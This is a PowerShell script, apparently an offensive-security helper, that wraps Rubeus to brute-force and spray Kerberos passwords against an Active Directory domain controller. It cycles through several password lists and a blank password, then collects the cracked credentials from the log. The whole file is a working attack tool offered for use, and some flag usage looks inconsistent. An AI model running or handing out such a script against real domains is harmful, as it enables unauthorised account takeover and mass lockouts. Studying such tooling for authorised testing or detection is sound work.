<#

1) Set Variables

$global:target="192.168.80.50"
$global:domain = "SECURE.local"
$global:userlist = "users.txt"
#

2) run the script 

./brute_rubeus.ps1

#>


$global:target=$args[0]

function checkoutput {
Get-Content .\rubeus.log | findstr STUPENDOUS | sort-object| Get-Unique > rubeus_brute_cracked.txt
}

function run-rubeus {
#$userlist =  "users.txt"
#$userlist =  "C:\Windows\Temp\dusers.txt"

#    Perform a Kerberos-based password bruteforcing attack:
#        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]



#.\Rubeus_3.5.exe
#.\Rubeus.exe"
#.\Rubeus-1.5.0.exe"
#.\Rubeus-1.4.1.exe"
date 

.\Rubeus_4.5.exe brute /password:password /dc:$target /noticket /outfile:rubeus.log
checkoutput

.\Rubeus_4.5.exe brute /password:pass5.txt /dc:$target /noticket /outfile:rubeus.log
checkoutput

.\Rubeus_4.5.exe brute /password:$userlist /dc:$target /noticket /outfile:rubeus.log
checkoutput

.\Rubeus_4.5.exe brute /password:" " /dc:$target /noticket /outfile:rubeus.log
checkoutput

.\Rubeus_4.5.exe brute /password:pass10.txt /dc:$target /noticket /outfile:rubeus.log
checkoutput

.\Rubeus_4.5.exe brute /password:pass100.txt /dc:$target /noticket /outfile:rubeus.log
checkoutput

date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\rubeus_brute_cracked.txt
}

if ($target) { 
run-rubeus | Tee rubeus_brute.txt
} else {
Write-Host "USEAGE: " 
Write-Host "	./rubeus-brute.ps1 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}



